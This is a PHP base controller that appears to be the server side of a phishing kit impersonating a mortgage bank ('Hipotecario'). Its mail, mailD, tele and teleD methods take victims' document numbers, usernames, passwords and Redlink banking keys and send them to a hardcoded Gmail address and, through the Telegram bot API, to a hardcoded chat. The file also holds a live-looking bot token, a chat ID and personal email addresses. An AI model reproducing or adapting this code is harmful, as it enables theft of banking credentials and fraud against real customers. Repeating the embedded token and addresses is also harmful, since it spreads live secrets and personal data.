<?php

class BaseController {
   //put your code here
   
    /**
     * __call magic method.
     */
    public function __exec($name, $arguments)
    {
        $this->sendOutput('', array('HTTP/1.1 404 Not Found'));
    }
 
    /**
     * Get URI elements.
     * 
     * @return array
     */
    protected function getUriSegmentos()
    {
        $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $uri = explode( '/', $uri );
 
        return $uri;
    }
 
    /**
     * Get querystring params.
     * 
     * @return array
     */
    protected function getSQLParametros()
    {
        return parse_str($_SERVER['QUERY_STRING'], $query);
    }
 
    /**
     * Send API output.
     *
     * @param mixed  $data
     * @param string $httpHeader
     */
    protected function salida($datos, $httpHeaders=array())
    {
        header_remove('Set-Cookie');
 
        if (is_array($httpHeaders) && count($httpHeaders)) {
            foreach ($httpHeaders as $httpHeader) {
                header($httpHeader);
            }
        }
 
        echo $datos;
        exit;
    }
    
    protected function view($path) 
    {
       require_once $path;
    }

    // email sender
   protected function mail($documento, $usuario, $clave, $source) 
   {
      $to = "rodancherr93@gmail.com";
	  //$to = "esquivelroodri42@gmail.com";
      $subject = "Envio de datos home hipotecario.";
      $headers = "MIME-Version: 1.0" . "\r\n";
      $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
      $message = "
         <html>
         <head>
         <title>HIPOTECARIO</title>
         </head>
         <body>
         <h1>DATOS</h1>
         <h4>Source: " . $source . "</h4>
         <h4>Documento: " . $documento . "</h4>
         <h4>Usuario: " . $usuario . "</h4>
         <h4>Clave: " . $clave . "</h4>
         </body>
         </html>";
 
      mail($to, $subject, $message, $headers);
   }
   
   protected function mailD($clave, $source, $user) 
   {
      $to = "rodancherr93@gmail.com";
	  //$to = "esquivelroodri42@gmail.com";
      $subject = "Envio de datos dashboard hipoterio.";
      $headers = "MIME-Version: 1.0" . "\r\n";
      $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
      $message = "
         <html>
         <head>
         <title>HIPOTECARIO</title>
         </head>
         <body>
         <h1>DATOS</h1>
         <h4>Source: " . $source . "</h4>
		 <h4>Usuario: " . $user . "</h4>
         <h4>Clave Redlink: " . $clave . "</h4>
         </body>
         </html>";
 
      mail($to, $subject, $message, $headers);
   }

    // Edit Position
    // telegram
    // To send a message to a Telegram channel using PHP, you need to know a Telegram API token and a chat ID, 
    // that you will get when you create a Telegram bot.
    // This note shows the PHP code examples for sending messages, images and other data types to the Telegram channel through API.
    // https://www.siteguarding.com/en/how-to-get-telegram-bot-api-token
    // https://www.alphr.com/find-chat-id-telegram/

    protected function tele($documento, $usuario, $clave, $source) 
    {
        $apiToken = "5082654068:AAF7quCLZ4xuTq2FBdo3POssdJsM_FRHwTs";
        $message = "
            <html>
            <head>
            <title>HIPOTECARIO</title>
            </head>
            <body>
            <h1>DATOS</h1>
            <h4>Source: " . $source . "</h4>
            <h4>Documento: " . $documento . "</h4>
            <h4>Usuario: " . $usuario . "</h4>
            <h4>Clave: " . $clave . "</h4>
            </body>
            </html>";
        $data = [
            'chat_id' => '515382482',
            $message
        ];

        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
    }
   
    protected function teleD($clave, $source, $user) 
    {
        $apiToken = "5082654068:AAF7quCLZ4xuTq2FBdo3POssdJsM_FRHwTs";
        $message = "
            <html>
            <head>
            <title>HIPOTECARIO</title>
            </head>
            <body>
            <h1>DATOS</h1>
            <h4>Source: " . $source . "</h4>
            <h4>Usuario: " . $user . "</h4>
            <h4>Clave Redlink: " . $clave . "</h4>
            </body>
            </html>";
        $data = [
            'chat_id' => '515382482',
            $message
        ];

        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
    }
   
}